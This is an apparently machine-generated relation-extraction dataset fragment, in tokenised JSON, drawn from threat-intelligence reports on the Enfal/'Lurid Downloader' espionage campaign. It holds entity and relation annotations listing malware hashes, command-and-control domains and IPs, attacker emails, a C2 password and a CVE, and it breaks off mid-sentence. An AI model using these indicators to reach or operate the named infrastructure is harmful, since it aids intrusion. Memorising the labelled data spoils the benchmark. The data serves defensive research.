"KNOWN", "TO", "CREATE", "THE", "UNIQUELY", "NAMED", "DIRECTORY", ":", "\u2018", "03A075FB70D5D675F9DC26FC", "\u2019", "MD5", "HASH", "FILE", "SIZE", "(", "BYTES", ")", "DATE(S", ")", "ANALYSED", "FILES", "CREATED", "NETWORK", "CONNECTIVITY", "16A3", "1AA8", "E7DD", "F66A", "3155", "1840", "573B", "6575", "155648", "13", "July", "2011"], ["(", "ThreatExpert", ",", "2011", ")", "$", "$", "$", "$", "$", "$", "$", "$", "mtx.bat"], ["winscard2.exe", "TCP", "port", "1058", "opened", "for", "inbound", "connections", "ABA9", "BAEA", "7082", "5E6A", "DF07", "2358", "7F27", "3DC4", "3514598", "29", "July", "2011"], ["(", "ThreatExpert", ",", "2011", ")"], ["zhenxiang.exe", "winscard.exe", "TCP", "ports", "1052", "and", "1053", "opened", "for", "inbound", "connections", "BCE1", "069D", "D099", "F151", "70C5", "FD05", "BAE9", "21B5", "133632", "29", "May", "2011", "(", "GFI", "SandBox", ",", "2011", ")"], ["03", "August", "2011", "(", "ThreatExpert", ",", "2011", ")", "106140_d.bat", "tcmoniter.exe", "pc.nprotects.org", "on", "TCP", "port", "80", "E8EE", "9373", "EE6C", "8360", "42E8", "F48D", "8DE2", "DDA9", "unknown", "08", "February", "2011", "(", "GFI", "Software", ",", "2011", ")", "$", "$", "$", "$", "$", "$", "$", "$", "fbl.bat", "tcomoniter.exe", "pc.nprotects.org", "on", "TCP", "port", "80", "FDF2", "C5C2", "B187", "4EFE", "7FD3", "3509", "2DF2", "D3BC", "unknown", "15", "July", "2011", "(", "GFI", "SandBox", ",", "2011", ")", "40984_d.bat"], ["wincard0.dll", "uxtheme.dll", "bbs.ezxsoft.com", "on", "TCP", "port", "80", "PAGE", "23", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["COPYRIGHT", "NOTICE"], ["Copyright", "\u00a9", "Command", "Five", "Pty", "Ltd."], ["All", "rights", "reserved", "."], ["This", "document", "is", "provided", "by", "the", "copyright", "holders", "under", "the", "licence", "that", "follows", "."], ["By", "obtaining", ",", "using", ",", "and/or", "distributing", "this", "document", "you", "agree", "that", "you", "have", "read", ",", "understood", ",", "and", "agree", "to", "the", "terms", "and", "conditions", "that", "follow", "."], ["The", "names", "and", "trademarks", "of", "Command", "Five", "Pty", "Ltd", "may", "not", "be", "used", "in", "advertising", "or", "publicity", "relating", "to", "this", "document", "or", "its", "contents", "without", "specific", ",", "prior", ",", "written", "permission", "."], ["No", "permission", "is", "given", "for", "this", "document", "to", "be", "used", "for", "commercial", "purposes", "or", "as", "part", "of", "any", "commercial", "activity", "or", "undertaking", ",", "including", ",", "but", "not", "limited", "to", ",", "use", "in", "or", "relating", "to", "advertising", "or", "publicity", ",", "and/or", "use", "in", "support", "of", ",", "or", "as", "part", "of", ",", "any", "pre\u00adsales", "or", "sales", "activities", "."], ["No", "permission", "is", "given", "to", "create", "modified", "or", "derivative", "works", "."], ["You", "may", "distribute", "this", "document", "in", "its", "original", "form", "for", "non\u00adcommercial", "purposes", "in", "accordance", "with", "the", "other", "terms", "and", "conditions", "stated", "herein", "."], ["Copyright", "title", "will", "at", "all", "times", "remain", "with", "the", "copyright", "holders", "."], ["All", "referenced", "trademarks", "remain", "the", "property", "of", "their", "respective", "owners", "."], ["THIS", "DOCUMENT", "IS", "PROVIDED", "\u2018", "AS", "IS", "\u2019", "FOR", "INFORMATIONAL", "PURPOSES", "ONLY", "WITH", "NO", "REPRESENTATIONS", "OR", "WARRANTIES", "OF"], ["ANY", "KIND", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "ANY", "WARRANTY", ",", "EXPRESS", "OR", "IMPLIED", ",", "OF", "MERCHANTABILITY", "OR", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ";", "WARRANTY", "OF", "NON\u00adINFRINGEMENT", ",", "OR", "TITLE", ";", "NOR", "ANY", "WARRANTIES", "PERTAINING", "TO", "THE", "ACCURACY", "OR", "COMPLETENESS", "OF", "CONTENT", "."], ["ANY", "OPINIONS", "EXPRESSED", "IN", "THIS", "DOCUMENT", "MAY", "CHANGE"], ["WITHOUT", "NOTICE", "AND", "ARE", "NOT", "NECESSARILY", "THE", "CONSIDERED", "OPINIONS", "OF", "COMMAND", "FIVE", "PTY", "LTD", ",", "ITS", "PARTNERS", ",", "EMPLOYEES", ",", "OR", "AFFILIATE", "ORGANISATIONS", "."], ["ANY", "ADVICE", "OFFERED", "IN", "THIS"], ["DOCUMENT", "IS", "OFFERED", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", "."], ["Command", "Five", "Pty", "Ltd", "ABN", ":", "49", "149", "576", "670", "http://www.commandfive.com"], ["info@commandfive.com", "PAGE", "24", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."]]}, {"vertexSet": [[{"name": "Lurid Downloader", "pos": [17, 19], "sent_id": 14, "type": "Malware"}], [{"name": "Enfal", "pos": [28, 29], "sent_id": 14, "type": "MalwareFamily"}], [{"name": "Russia", "pos": [8, 9], "sent_id": 15, "type": "Country"}], [{"name": "China", "pos": [12, 13], "sent_id": 19, "type": "Country"}], [{"name": "Aurora", "pos": [6, 7], "sent_id": 23, "type": "Campaign"}], [{"name": "Google", "pos": [10, 11], "sent_id": 23, "type": "Organization"}], [{"name": "late 2009", "pos": [12, 14], "sent_id": 23, "type": "Time"}], [{"name": "U.S.", "pos": [5, 6], "sent_id": 25, "type": "Country"}], [{"name": "space industry", "pos": [7, 9], "sent_id": 28, "type": "Information"}], [{"name": "operations in oil & gas, mining", "pos": [12, 19], "sent_id": 28, "type": "Information"}], [{"name": "spear phishing", "pos": [2, 4], "sent_id": 35, "type": "MalwareCharacteristics"}], [{"name": "Lurid Downloader", "pos": [6, 8], "sent_id": 36, "type": "Malware"}], [{"name": "Enfal", "pos": [17, 18], "sent_id": 37, "type": "MalwareFamily"}], [{"name": "NGOs", "pos": [13, 14], "sent_id": 38, "type": "ExploitTargetObject"}], [{"name": "GhostNet", "pos": [20, 21], "sent_id": 39, "type": "Attacker"}], [{"name": "ShadowNet", "pos": [24, 25], "sent_id": 39, "type": "Attacker"}], [{"name": "Byzantine Hades", "pos": [24, 26], "sent_id": 41, "type": "AttackerGroup"}], [{"name": "Byzantine Anchor", "pos": [38, 40], "sent_id": 41, "type": "Attacker"}], [{"name": "Byzantine Candor", "pos": [43, 45], "sent_id": 41, "type": "Attacker"}], [{"name": "Byzantine Foothold", "pos": [48, 50], "sent_id": 41, "type": "Attacker"}], [{"name": "Lurid Downloader", "pos": [2, 4], "sent_id": 43, "type": "Malware"}], [{"name": "Lurid Downloader", "pos": [23, 25], "sent_id": 48, "type": "Campaign"}], [{"name": "Kazakhstan", "pos": [39, 40], "sent_id": 55, "type": "Country"}], [{"name": "Ukraine", "pos": [44, 45], "sent_id": 55, "type": "Country"}], [{"name": "Adobe Reader", "pos": [19, 21], "sent_id": 72, "type": "Software"}], [{"name": "Microsoft Of\ufb01ce", "pos": [27, 29], "sent_id": 72, "type": "Software"}], [{"name": "ohhdl@dalailama.com", "pos": [10, 11], "sent_id": 79, "type": "Email"}], [{"name": "LOSAR FLYER_edited-3.pdf", "pos": [7, 9], "sent_id": 80, "type": "File"}], [{"name": "info3.gawab.com", "pos": [4, 5], "sent_id": 82, "type": "Indicator"}], [{"name": "66.220.20.18", "pos": [6, 7], "sent_id": 82, "type": "Address"}], [{"name": "emb107@gawab.com", "pos": [13, 14], "sent_id": 82, "type": "Email"}], [{"name": "96.46.11.88", "pos": [6, 7], "sent_id": 83, "type": "Address"}], [{"name": "322fcf1b134fef1bae52fbd80a373ede", "pos": [4, 5], "sent_id": 89, "type": "MD5"}], [{"name": "LOSAR_FLYER_edited-3.pdf", "pos": [5, 6], "sent_id": 89, "type": "File"}], [{"name": "TROJ_PIDIEF.SMZX", "pos": [6, 7], "sent_id": 89, "type": "Malware"}], [{"name": "util.printd", "pos": [16, 17], "sent_id": 89, "type": "Vulnerability"}], [{"name": "CVE2009-4324", "pos": [19, 22], "sent_id": 89, "type": "Vulnerability"}], [{"name": "Adobe Reader 9.x", "pos": [25, 28], "sent_id": 89, "type": "Software"}], [{"name": "84d24967cb5cbacf4052a3001692dd54", "pos": [4, 5], "sent_id": 91, "type": "MD5"}], [{"name": "ctfmon.exe", "pos": [5, 6], "sent_id": 91, "type": "File"}], [{"name": "TROJ_MECIV.A", "pos": [6, 7], "sent_id": 91, "type": "Malware"}], [{"name": "CVE-2009-4324", "pos": [12, 15], "sent_id": 92, "type": "Vulnerability"}], [{"name": "3447416fbbc65906bd0384d4c2ba479e", "pos": [4, 5], "sent_id": 95, "type": "MD5"}], [{"name": "mspmsnsr.dll", "pos": [5, 6], "sent_id": 95, "type": "File"}], [{"name": "TROJ_MECIV.A", "pos": [0, 1], "sent_id": 96, "type": "Malware"}], [{"name": "ctfmon.exe", "pos": [5, 6], "sent_id": 99, "type": "Dropper"}], [{"name": "mspmsnsr.dll", "pos": [7, 8], "sent_id": 100, "type": "File"}], [{"name": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WmdmPmSp\\Parameters", "pos": [12, 13], "sent_id": 101, "type": "Indicator"}], [{"name": "856de08a947a40e00ea7ed66b8e02c53", "pos": [4, 5], "sent_id": 104, "type": "MD5"}], [{"name": "isssync.exe", "pos": [5, 6], "sent_id": 104, "type": "File"}], [{"name": "WORM_OTORUN.TMP", "pos": [6, 7], "sent_id": 104, "type": "GeneralVirus"}], [{"name": "Computer name", "pos": [2, 4], "sent_id": 110, "type": "SystemInformation"}], [{"name": "MAC address", "pos": [4, 6], "sent_id": 110, "type": "SystemInformation"}], [{"name": "computer OS and version", "pos": [6, 10], "sent_id": 110, "type": "SystemInformation"}], [{"name": "IP address", "pos": [10, 12], "sent_id": 110, "type": "NetworkInformation"}], [{"name": "language of the operating system", "pos": [14, 19], "sent_id": 110, "type": "SystemInformation"}], [{"name": "XOR singlebyte encryption", "pos": [10, 13], "sent_id": 115, "type": "MalwareCharacteristics"}], [{"name": "HTTP protocol", "pos": [12, 14], "sent_id": 123, "type": "MalwareCharacteristics"}], [{"name": "/trandocs/mm/", "pos": [17, 20], "sent_id": 124, "type": "Indicator"}], [{"name": "123", "pos": [14, 15], "sent_id": 125, "type": "Indicator"}], [{"name": "hallelujah", "pos": [8, 9], "sent_id": 131, "type": "Password"}], [{"name": "/trandocs/mm/ <machine_name>:<MAC address>/Cmwhite", "pos": [14, 20], "sent_id": 136, "type": "Indicator"}], [{"name": "/cgl-bin/Clnpp5.cgi", "pos": [27, 32], "sent_id": 139, "type": "Indicator"}], [{"name": "/cgl-bin/Rwpq1.cgi", "pos": [16, 21], "sent_id": 140, "type": "Indicator"}], [{"name": "e:\\programs\\LuridDownLoader\\LuridDownloader", "pos": [24, 25], "sent_id": 209, "type": "Indicator"}], [{"name": "Falcon\\DllServiceTrojan\\Release\\DllServiceTrojan.pdb", "pos": [26, 27], "sent_id": 209, "type": "TrojanHorse"}], [{"name": "e:\\programs\\LuridDownLoader\\LuridDownloader", "pos": [0, 1], "sent_id": 210, "type": "Indicator"}], [{"name": "Falcon\\ServiceDll\\Release\\ ServiceDll.pdb", "pos": [2, 4], "sent_id": 210, "type": "Malware"}], [{"name": "Lurid DownLoader", "pos": [8, 10], "sent_id": 211, "type": "Malware"}], [{"name": "bruce_tuner@yahoo.com", "pos": [11, 12], "sent_id": 218, "type": "Email"}], [{"name": "icqmaster@163.com", "pos": [15, 16], "sent_id": 218, "type": "Email"}], [{"name": "mailru-vip.com", "pos": [16, 17], "sent_id": 220, "type": "Indicator"}], [{"name": "yandex-vip.com", "pos": [17, 18], "sent_id": 220, "type": "Indicator"}], [{"name": "google-of\ufb01ceonline.com", "pos": [0, 1], "sent_id": 221, "type": "Indicator"}], [{"name": "of\ufb01ce-helppane.com", "pos": [0, 1], "sent_id": 222, "type": "Indicator"}], [{"name": "foxit-pro.com", "pos": [1, 2], "sent_id": 222, "type": "Indicator"}], [{"name": "ymail-vip.com", "pos": [0, 1], "sent_id": 223, "type": "Indicator"}], [{"name": "ymail-pro.com", "pos": [1, 2], "sent_id": 223, "type": "Indicator"}], [{"name": "yandex-pro.com", "pos": [0, 1], "sent_id": 224, "type": "Indicator"}], [{"name": "google-of\ufb01ce.com", "pos": [0, 1], "sent_id": 225, "type": "Indicator"}], [{"name": "mailru-pro.com", "pos": [1, 2], "sent_id": 225, "type": "Indicator"}], [{"name": "xiaohu wang", "pos": [2, 4], "sent_id": 225, "type": "Person"}], [{"name": "bruce_tuner@yahoo.com", "pos": [4, 5], "sent_id": 225, "type": "Email"}], [{"name": "hoticq.com", "pos": [11, 12], "sent_id": 226, "type": "Indicator"}], [{"name": "redhag.com", "pos": [12, 13], "sent_id": 226, "type": "Indicator"}], [{"name": "zadhc.com", "pos": [13, 14], "sent_id": 226, "type": "Indicator"}], [{"name": "lasmail.com", "pos": [14, 15], "sent_id": 226, "type": "Indicator"}], [{"name": "hotoicq.com", "pos": [15, 16], "sent_id": 226, "type": "Indicator"}], [{"name": "jason bush", "pos": [16, 18], "sent_id": 226, "type": "Person"}], [{"name": "icqmaster@163.com", "pos": [0, 1], "sent_id": 227, "type": "Email"}], [{"name": "Xueyuan Road", "pos": [5, 7], "sent_id": 228, "type": "Location"}], [{"name": "Haidian District", "pos": [8, 10], "sent_id": 228, "type": "Location"}], [{"name": "Beijing", "pos": [11, 12], "sent_id": 228, "type": "Location"}], [{"name": "Vietnam", "pos": [8, 9], "sent_id": 266, "type": "Country"}], [{"name": "India", "pos": [10, 11], "sent_id": 266, "type": "Country"}], [{"name": "Mongolia", "pos": [12, 13], "sent_id": 266, "type": "Country"}], [{"name": "China", "pos": [14, 15], "sent_id": 266, "type": "Country"}], [{"name": "June and July 2011", "pos": [14, 18], "sent_id": 268, "type": "Time"}], [{"name": "strong", "pos": [3, 4], "sent_id": 277, "type": "Campaign"}], [{"name": "Vietnam", "pos": [13, 14], "sent_id": 277, "type": "Country"}], [{"name": "ejun0708", "pos": [0, 1], "sent_id": 278, "type": "Campaign"}], [{"name": "Russia", "pos": [4, 5], "sent_id": 278, "type": "Country"}], [{"name": "Ukraine", "pos": [8, 9], "sent_id": 278, "type": "Country"}], [{"name": "Czech Republic", "pos": [13, 15], "sent_id": 278, "type": "Country"}], [{"name": "Kazakhstan", "pos": [16, 17], "sent_id": 278, "type": "Country"}], [{"name": "Switzerland", "pos": [18, 19], "sent_id": 278, "type": "Country"}], [{"name": "Tajikistan", "pos": [20, 21], "sent_id": 278, "type": "Country"}], [{"name": "Belarus", "pos": [22, 23], "sent_id": 278, "type": "Country"}], [{"name": "ejun0614", "pos": [0, 1], "sent_id": 279, "type": "Campaign"}], [{"name": "Russia", "pos": [4, 5], "sent_id": 279, "type": "Country"}], [{"name": "China", "pos": [8, 9], "sent_id": 279, "type": "Country"}], [{"name": "Kyrgyzstan", "pos": [12, 13], "sent_id": 279, "type": "Country"}], [{"name": "Tajikistan", "pos": [16, 17], "sent_id": 279, "type": "Country"}], [{"name": "UK", "pos": [21, 22], "sent_id": 279, "type": "Country"}], [{"name": "US", "pos": [23, 24], "sent_id": 279, "type": "Country"}], [{"name": "S. Korea", "pos": [25, 27], "sent_id": 279, "type": "Country"}], [{"name": "Czech republic", "pos": [28, 30], "sent_id": 279, "type": "Country"}], [{"name": "Pakistan", "pos": [31, 32], "sent_id": 279, "type": "Country"}], [{"name": "Germany", "pos": [33, 34], "sent_id": 279, "type": "Country"}], [{"name": "Kazakhstan", "pos": [35, 36], "sent_id": 279, "type": "Country"}], [{"name": "strongNewDns", "pos": [0, 1], "sent_id": 280, "type": "Campaign"}], [{"name": "Vietnam", "pos": [10, 11], "sent_id": 280, "type": "Country"}], [{"name": "ejun0509", "pos": [0, 1], "sent_id": 281, "type": "Campaign"}], [{"name": "Russia", "pos": [4, 5], "sent_id": 281, "type": "Country"}], [{"name": "Ukraine", "pos": [8, 9], "sent_id": 281, "type": "Country"}], [{"name": "ejun0511", "pos": [9, 10], "sent_id": 281, "type": "Campaign"}], [{"name": "Russia", "pos": [13, 14], "sent_id": 281, "type": "Country"}], [{"name": "Ukraine", "pos": [17, 18], "sent_id": 281, "type": "Country"}], [{"name": "Kazakhstan", "pos": [21, 22], "sent_id": 281, "type": "Country"}], [{"name": "Czech Republic", "pos": [27, 29], "sent_id": 281, "type": "Country"}], [{"name": "Azerbaijan", "pos": [30, 31], "sent_id": 281, "type": "Country"}], [{"name": "7-28", "pos": [31, 34], "sent_id": 281, "type": "Campaign"}], [{"name": "Vietnam", "pos": [37, 38], "sent_id": 281, "type": "Country"}], [{"name": "UAE", "pos": [42, 43], "sent_id": 281, "type": "Country"}], [{"name": "Cambodia", "pos": [44, 45], "sent_id": 281, "type": "Country"}], [{"name": "Thailand", "pos": [46, 47], "sent_id": 281, "type": "Country"}], [{"name": "China", "pos": [48, 49], "sent_id": 281, "type": "Country"}], [{"name": "ejun0503", "pos": [49, 50], "sent_id": 281, "type": "Campaign"}], [{"name": "Russia", "pos": [53, 54], "sent_id": 281, "type": "Country"}], [{"name": "Ukraine", "pos": [58, 59], "sent_id": 281, "type": "Country"}], [{"name": "Czech Republic", "pos": [60, 62], "sent_id": 281, "type": "Country"}], [{"name": "0dayaug12.exe", "pos": [62, 63], "sent_id": 281, "type": "Campaign"}], [{"name": "Belarus", "pos": [66, 67], "sent_id": 281, "type": "Country"}], [{"name": "Kazakhstan", "pos": [70, 71], "sent_id": 281, "type": "Country"}], [{"name": "Netherlands", "pos": [13, 14], "sent_id": 282, "type": "Country"}], [{"name": "Switzerland", "pos": [19, 20], "sent_id": 282, "type": "Country"}], [{"name": "European Union", "pos": [22, 24], "sent_id": 282, "type": "Region"}], [{"name": "Enfal", "pos": [4, 5], "sent_id": 339, "type": "MalwareFamily"}], [{"name": "Lurid Downloader", "pos": [14, 16], "sent_id": 339, "type": "Malware"}]], "labels": [{"r": "P27", "h": 4, "t": 5, "evidence": [23]}, {"r": "P33", "h": 4, "t": 6, "evidence": [23]}, {"r": "P32", "h": 4, "t": 7, "evidence": [23, 25]}, {"r": "P3", "h": 17, "t": 16, "evidence": [41]}, {"r": "P3", "h": 18, "t": 16, "evidence": [41]}, {"r": "P3", "h": 19, "t": 16, "evidence": [41]}, {"r": "P32", "h": 21, "t": 22, "evidence": [48, 55]}, {"r": "P32", "h": 21, "t": 23, "evidence": [48, 55]}, {"r": "P9", "h": 26, "t": 27, "evidence": [79, 80]}, {"r": "P7", "h": 34, "t": 35, "evidence": [89]}, {"r": "P7", "h": 34, "t": 36, "evidence": [89]}, {"r": "P19", "h": 37, "t": 36, "evidence": [89]}, {"r": "P19", "h": 37, "t": 35, "evidence": [89]}, {"r": "P7", "h": 40, "t": 35, "evidence": [89, 91]}, {"r": "P7", "h": 40, "t": 41, "evidence": [91, 92]}, {"r": "P21", "h": 39, "t": 40, "evidence": [91]}, {"r": "P21", "h": 38, "t": 40, "evidence": [91]}, {"r": "P21", "h": 33, "t": 34, "evidence": [89]}, {"r": "P21", "h": 32, "t": 34, "evidence": [89]}, {"r": "P21", "h": 43, "t": 44, "evidence": [95, 96]}, {"r": "P21", "h": 42, "t": 44, "evidence": [95, 96]}, {"r": "P21", "h": 46, "t": 45, "evidence": [99, 100]}, {"r": "P21", "h": 49, "t": 50, "evidence": [104]}, {"r": "P21", "h": 48, "t": 50, "evidence": [104]}, {"r": "P21", "h": 64, "t": 65, "evidence": [209]}, {"r": "P21", "h": 66, "t": 67, "evidence": [210]}, {"r": "P32", "h": 98, "t": 99, "evidence": [277]}, {"r": "P32", "h": 100, "t": 101, "evidence": [278]}, {"r": "P32", "h": 100, "t": 102, "evidence": [278]}, {"r": "P32", "h": 100, "t": 103, "evidence": [278]}, {"r": "P32", "h": 100, "t": 104, "evidence": [278]}, {"r": "P32", "h": 100, "t": 105, "evidence": [278]}, {"r": "P32", "h": 100, "t": 106, "evidence": [278]}, {"r": "P32", "h": 100, "t": 107, "evidence": [278]}, {"r": "P32", "h": 108, "t": 109, "evidence": [279]}, {"r": "P32", "h": 108, "t": 110, "evidence": [279]}, {"r": "P32", "h": 108, "t": 111, "evidence": [279]}, {"r": "P32", "h": 108, "t": 112, "evidence": [279]}, {"r": "P32", "h": 108, "t": 113, "evidence": [279]}, {"r": "P32", "h": 108, "t": 114, "evidence": [279]}, {"r": "P32", "h": 108, "t": 115, "evidence": [279]}, {"r": "P32", "h": 108, "t": 116, "evidence": [279]}, {"r": "P32", "h": 108, "t": 117, "evidence": [279]}, {"r": "P32", "h": 108, "t": 118, "evidence": [279]}, {"r": "P32", "h": 108, "t": 119, "evidence": [279]}, {"r": "P32", "h": 120, "t": 121, "evidence": [280]}, {"r": "P32", "h": 122, "t": 123, "evidence": [281]}, {"r": "P32", "h": 122, "t": 124, "evidence": [281]}, {"r": "P32", "h": 125, "t": 130, "evidence": [281]}, {"r": "P32", "h": 125, "t": 126, "evidence": [281]}, {"r": "P32", "h": 125, "t": 127, "evidence": [281]}, {"r": "P32", "h": 125, "t": 128, "evidence": [281]}, {"r": "P32", "h": 125, "t": 129, "evidence": [281]}, {"r": "P32", "h": 131, "t": 132, "evidence": [281]}, {"r": "P32", "h": 131, "t": 133, "evidence": [281]}, {"r": "P32", "h": 131, "t": 134, "evidence": [281]}, {"r": "P32", "h": 131, "t": 135, "evidence": [281]}, {"r": "P32", "h": 131, "t": 136, "evidence": [281]}, {"r": "P32", "h": 137, "t": 138, "evidence": [281]}, {"r": "P32", "h": 137, "t": 139, "evidence": [281]}, {"r": "P32", "h": 137, "t": 140, "evidence": [281]}, {"r": "P32", "h": 141, "t": 142, "evidence": [281]}, {"r": "P32", "h": 141, "t": 143, "evidence": [281]}, {"r": "P14", "h": 148, "t": 147, "evidence": [339]}, {"r": "P16", "h": 147, "t": 148, "evidence": [339]}, {"r": "P16", "h": 1, "t": 0, "evidence": [14]}, {"r": "P14", "h": 0, "t": 1, "evidence": [14]}], "title": "201109TrendLabsLuridDownloader", "sents": [["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER", "TrendLabs", "\u2122"], ["By", "Nart", "Villeneuve", "&", "David", "Sancho"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "CONTENTS", "ABSTRACT", "....................................................................................................."], ["3", "INTRODUCTION", "............................................................................................", "4", "ATTACK", "VECTOR", "...........................................................................................", "6"], ["MALWARE", "......................................................................................................", "6"], ["COMMUNICATION", "WITH", "THE", "COMMAND", "AND", "CONTROL", "SERVER", "..........", "8", "COMMANDS", "...................................................................................................", "8", "TOOL", "MARKS", "..............................................................................................."], ["10", "COMMAND", "AND", "CONTROL", "INFRASTRUCTURE", ".......................................", "10", "COMPROMISED", "ORGANIZATIONS", ".............................................................", "12", "MALWARE", "CAMPAIGNS", "..............................................................................", "13", "NOTEWORTHY", "COMPROMISED", "ORGANIZATIONS", ".................................."], ["14", "DATA", "EX", "-", "FILTRATION", ".................................................................................."], ["15", "ATTRIBUTION", ".............................................................................................."], ["16", "CONCLUSION", ".............................................................................................."], ["16", "2", "|", "RESEARCH", "PAPER", "THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS"], ["ABSTRACT"], ["This", "report", "investigates", "a", "campaign", "of", "targeted", "malware", "attacks", "that", "has", "successfully", "compromised", "1465", "computers", "in", "61", "different", "countries", "."], ["Based", "on", "the", "project", "path", "embedded", "in", "the", "malware", ",", "we", "have", "named", "this", "speci\ufb01c", "campaign", "\u201c", "Lurid", "Downloader", "\u201d", "although", "the", "malware", "is", "typically", "known", "as", "\u201c", "Enfal", "\u201d", "."], ["The", "majority", "of", "the", "victims", "are", "located", "in", "Russia", "and", "other", "members", "of", "the", "Commonwealth", "of", "Independent", "States", "(", "CIS", ")", "."], ["We", "were", "able", "to", "identify", "47", "victims", "that", "include", "numerous", "government", "ministries", "and", "diplomatic", "missions", "along", "with", "space", "-", "related", "government", "agencies", ",", "companies", "and", "research", "institutions", "in", "Russia", "and", "other", "members", "of", "the", "CIS", "along", "with", "a", "smaller", "amount", "of", "similar", "entities", "in", "Europe", "."], ["The", "threat", "actors", "behind", "\u201c", "Lurid", "Downloader", "\u201d", "launched", "301", "malware", "campaigns", "targeting", "entities", "in", "speci\ufb01c", "countries", "or", "geographic", "regions", "and", "tracked", "the", "success", "of", "each", "campaign", "by", "embedding", "a", "unique", "identi\ufb01er", "in", "each", "instance", "of", "malware", "and", "associating", "it", "with", "speci\ufb01c", "victims", "."], ["While", "some", "campaigns", "resulted", "in", "numerous", "victims", ",", "others", "were", "very", "speci\ufb01c", "and", "targeted", "resulting", "in", "only", "one", "or", "two", "victims", "."], ["While", "previous", "Enfal", "activity", "has", "been", "typically", "associated", "with", "threat", "actors", "in", "China", ",", "it", "remains", "unclear", "who", "is", "behind", "the", "Lurid", "Downloader", "attacks", "."], ["3", "|", "RESEARCH", "PAPER"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "INTRODUCTION"], ["Prior", "to", "the", "highly", "publicized", "\u201c", "Aurora", "\u201d", "attack", "on", "Google", "in", "late", "2009", ",", "which", "also", "affected", "at", "least", "20", "other", "companies", ",", "there", "was", "little", "public", "awareness", "regarding", "targeted", "malware", "attacks1", "."], ["However", ",", "such", "attacks", "have", "been", "taking", "place", "for", "years", "and", "continue", "to", "affect", "government", ",", "military", ",", "corporate", ",", "educational", ",", "and", "civil", "society", "networks", "today", "."], ["While", "such", "attacks", "against", "the", "U.S.", "government", "and", "related", "networks", "are", "now", "fairly", "well", "-", "known", ",", "other", "governments", "and", "an", "increasing", "number", "of", "companies", "are", "facing", "similar", "threats", "."], ["Russia", "and", "other", "countries", "in", "the", "Commonwealth", "of"], ["Independent", "States", "are", "also", "being", "targeted", "and", "compromised", "."], ["These", "countries", "have", "an", "expertise", "in", "the", "space", "industry", "and", "also", "have", "operations", "in", "oil", "&", "gas", ",", "mining", "and", "other", "industry", "areas", "that", "have", "been", "targeted", "by", "malware", "attacks", "in", "the", "past", "."], ["Malware", "attacks", "that", "exploit", "vulnerabilities", "in", "popular", "software", "in", "order", "to", "compromise", "speci\ufb01c", "target", "sets", "are", "becoming", "increasingly", "commonplace", "."], ["These", "attacks", "are", "not", "automated", "or", "indiscriminate", "nor", "are", "they", "conducted", "by", "opportunistic", "amateurs", "."], ["Known", "as", "targeted", "malware", "attacks", ",", "these", "attacks", "refer", "to", "computer", "intrusions", "staged", "by", "threat", "actors", "that", "aggressively", "pursue", "and", "compromise", "speci\ufb01c", "targets", "."], ["Targeted", "malware", "attacks", "are", "typically", "part", "of", "broader", "campaigns", ",", "a", "series", "of", "failed", "and", "success", "compromises", ",", "by", "speci\ufb01c", "threat", "actors", "and", "not", "isolated", "attacks", "."], ["However", ",", "the", "speci\ufb01city", "of", "the", "attacker", "\u2019s", "prior", "knowledge", "of", "the", "victim", "affects", "the", "level", "of", "targeting", "associated", "with", "a", "single", "attack", "."], ["As", "a", "result", ",", "some", "attacks", "appear", "to", "be", "less", "precise", ",", "or", "\u201c", "noisy", "\u201d", ",", "and", "are", "aimed", "at", "a", "broader", "community", "."], ["Such", "\u201c", "spear", "phishing", "\u201d", "attacks", "are", "usually", "\u201c", "directed", "toward", "a", "group", "of", "people", "with", "a", "commonality", "\u201d", "as", "opposed", "to", "a", "speci\ufb01c", "target", "but", "are", "useful", "for", "gaining", "an", "initial", "foothold", "in", "a", "future", "target", "of", "interest2", "."], ["The", "malware", "used", "in", "the", "\u201c", "Lurid", "Downloader", "\u201d", "attacks", "is", "commonly", "known", "as", "\u201c", "Enfal", "\u201d", "and", "it", "has", "been", "used", "in", "targeted", "attacks", "as", "far", "back", "as", "20063", "."], ["In", "2008", ",", "Maarten", "Van", "Horenbeeck", "documented", "a", "series", "of", "targeted", "malware", "attacks", "that", "made", "use", "the", "Enfal"], ["Trojan", "to", "target", "non", "-", "governmental", "organizations", ",", "non", "-", "governmental", "organizations", "(", "NGOs", ")", "as", "well", "as", "defense", "contractors", "and", "U.S.", "government", "employees4", "."], ["In", "2009", "and", "2010", ",", "researchers", "from", "the", "University", "of", "Toronto", "published", "reports", "on", "two", "cyberespionage", "networks", "known", "as", "\u201c", "GhostNet", "\u201d", "and", "\u201c", "ShadowNet", "\u201d", "that", "included", "malware", "and", "command", "and", "control", "infrastructure", "connected", "with", "the", "Enfal", "Trojan5", "."], ["The", "domain", "names", "used", "by", "Enfal", "as", "command", "and", "control", "servers", "are", ",", "according", "to", "U.S.", "diplomatic", "cables", "leaked", "to", "Wikileaks", ",", "linked", "to", "a", "series", "of", "attacks", "known", "as", "\u201c", "Byzantine", "Hades", ".", "\u201d"], ["According", "to", "these", "leaked", "cables", ",", "the", "activity", "of", "this", "set", "of", "threat", "actors", "has", "been", "ongoing", "since", "2002", "and", "is", "known", "as", "\u201c", "Byzantine", "Hades", "\u201d", ",", "and", "there", "are", "subsets", "of", "this", "activity", "known", "as", "\u201c", "Byzantine", "Anchor", ",", "\u201d", "\u201c", "Byzantine", "Candor", "\u201d", "and", "\u201c", "Byzantine", "Foothold\u201d6", "."], ["However", ",", "it", "is", "important", "to", "note", "that", "other", "than", "the", "use", "of", 